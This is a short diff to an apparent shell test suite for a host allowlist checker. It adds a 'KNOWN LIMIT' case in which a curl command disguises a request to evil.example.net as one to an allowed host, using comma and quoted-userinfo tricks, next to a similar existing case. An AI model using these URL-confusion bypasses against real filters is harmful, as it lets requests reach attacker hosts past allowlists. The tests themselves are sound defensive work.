@@ -1118,6 +1118,9 @@ check "KNOWN LIMIT: a closing quote then a hyphen" allow "$sample_dir/sk10.sh" \
 check "KNOWN LIMIT: a port, a comma, then a quoted word and an at sign" allow "$sample_dir/sk11.sh" \
   'curl https://erpc.global:8080,"x"@evil.example.net/p'
 
+check "KNOWN LIMIT: a comma, then a quoted word and an at sign, no port" allow "$sample_dir/sk12.sh" \
+  'curl https://erpc.global,"x"@evil.example.net/p'
+
 # --- the invariant ------------------------------------------------------
 #
 # Every shape-specific case above pins one bypass. This pins the property
